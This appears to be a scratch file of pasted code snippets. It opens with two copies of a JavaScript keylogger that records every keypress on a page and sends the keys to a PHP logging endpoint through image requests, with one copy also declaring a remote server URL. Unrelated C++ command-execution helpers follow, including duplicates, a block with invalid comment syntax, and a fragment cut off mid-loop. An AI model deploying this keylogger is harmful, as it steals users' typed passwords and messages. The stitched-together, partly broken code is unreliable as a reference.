var keys='';
var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
        keys = '';
    }
}, 1000);

var keys='';
document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys != '') {
        new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
        keys = '';
    }
}, 500);

#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main()
{
    // run a process and create a streambuf that reads its stdout and stderr
    redi::ipstream proc("./some_command", redi::pstreams::pstdout | redi::pstreams::pstderr);
    std::string line;
    // read child's stdout
    while (std::getline(proc.out(), line))
        std::cout << "stdout: " << line << '\n';
    # if reading stdout stopped at EOF then reset the state:
    if (proc.eof() && proc.fail())
        proc.clear();
    // read child's stderr
    while (std::getline(proc.err(), line))
        std::cout << "stderr: " << line << '\n';
}
while (true)
{
    switch (readResult = read(childToParent[READ_FD],
        buffer, BUFFER_SIZE))
    {
        case 0: /* End-of-File, or non-blocking read. */
            cout << "End of file reached..."         << endl
            << "Data received was ("
            << dataReadFromChild.size() << "): " << endl
            << dataReadFromChild                << endl;

            ASSERT_IS(pid, waitpid(pid, & status, 0));

            cout << endl
            << "Child exit staus is:  " << WEXITSTATUS(status) << endl
            << endl;

            exit(0);